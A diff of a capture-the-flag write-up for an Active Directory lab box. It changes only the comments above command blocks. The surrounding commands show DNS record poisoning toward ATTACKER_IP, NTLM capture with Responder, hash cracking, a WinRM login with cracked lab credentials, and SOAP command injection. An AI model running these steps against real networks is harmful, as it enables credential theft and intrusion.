@@ -45,15 +45,15 @@ Root Flag
 
 ### Host Setup
 ```bash
-# What it does: adds machine domains to /etc/hosts.
-# Why here: resolve virtual hosts during web enumeration.
+# What it does: add the target IP and domain names to the local hosts file.
+# Why here: ensure proper resolution for Active Directory domain and hostname lookups.
 echo "TARGET_IP overwatch.htb S200401.overwatch.htb S200401" | sudo tee -a /etc/hosts
 ```
 
 ### Nmap Scan
 ```bash
-# What it does: runs an Nmap scan with the specified ports/scripts/options.
-# Why here: identify exposed services and decide on the next enumeration.
+# What it does: perform an Nmap scan targeting common AD and MSSQL ports.
+# Why here: discover the specific ports used by the Windows environment, including the non-standard MSSQL port 6520.
 nmap -sVC -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,6520,9389,49664,49667,49958,49959,55427,57249,59340,59343 -Pn -n TARGET_IP
 ```
 
@@ -96,8 +96,8 @@ Downloaded binaries and configuration files from the share. The key file was `ov
 
 **Extract Unicode strings from the binary and search for credentials:**
 ```bash
-# What it does: filters text with the specified pattern.
-# Why here: extract the important clue from a large output.
+# What it does: extract UTF-16 little-endian strings from the overwatch.exe binary.
+# Why here: search for hardcoded connection strings or credentials within the application.
 strings -e l overwatch.exe | grep -iE "password|user|sql|connection"
 ```
 
@@ -333,8 +333,8 @@ dnstool -u 'OVERWATCH\sqlsvc' -p 'TI0LKcfHzZw1Vv' \
   --action add --record SQL07 --data <ATTACKER_IP> TARGET_IP
 
 # Start Responder to capture NTLM authentication
-# What it does: arranca Responder en la interfaz indicada.
-# Why here: capturar autenticaciones NTLM para crackeo o analisis de relay.
+# What it does: start Responder to capture NTLM authentication.
+# Why here: catch the NTLMv2 hash when the SQL Server attempts to authenticate to our poisoned DNS record.
 sudo responder -I tun0
 ```
 
@@ -351,8 +351,8 @@ EXEC ('SELECT @@version') AT SQL07;
 ### Step 6 — Crack the Hash
 
 ```bash
-# What it does: cracks hashes with the specified mode and wordlist.
-# Why here: recuperar credenciales o confirmar que no estan en la lista.
+# What it does: crack the captured NTLMv2 hash using rockyou.txt.
+# Why here: recover the cleartext password for the sqlmgmt account.
 hashcat -m 5600 <captured_hash> /usr/share/wordlists/rockyou.txt --force
 ```
 
@@ -403,8 +403,8 @@ The cracked hash revealed credentials for `sqlmgmt`, a member of the **Remote Ma
 
 ### Connect via WinRM
 ```bash
-# What it does: opens a WinRM shell with the specified credentials/hash.
-# Why here: obtain interactive Windows access after validating credentials.
+# What it does: connect to the target via WinRM as sqlmgmt.
+# Why here: establish the first interactive session on the DC using the cracked credentials.
 evil-winrm -i TARGET_IP -u 'sqlmgmt' -p 'bIhBbzMMnB82yx'
 ```
 
@@ -475,8 +475,8 @@ Get-Process -Id (Get-NetTCPConnection -LocalPort 8000 -ErrorAction SilentlyConti
 
 Explored the service directory:
 ```powershell
-# What it does: changes the current directory.
-# Why here: position in the necessary path for the next command.
+# What it does: navigate to the WCF service directory.
+# Why here: inspect the application binaries and configuration for command injection vulnerabilities.
 cd C:\Software\Monitoring\
 Get-ChildItem -Force | Format-Table Name, Length, LastWriteTime -AutoSize
 Get-ChildItem -Force -Recurse | Select-Object FullName, Length, LastWriteTime
@@ -546,8 +546,8 @@ This tells the service to: `kill notepad` **AND THEN** `cat the root flag`.
 ### Exploit with curl
 
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: send a malicious SOAP request with an injected command.
+# Why here: exploit the unvalidated KillProcess parameter to read the root flag as SYSTEM.
 curl.exe -X POST http://127.0.0.1:8000/MonitorService `
   -H "Content-Type: text/xml; charset=utf-8" `
   -H "SOAPAction: http://tempuri.org/IMonitoringService/KillProcess" `
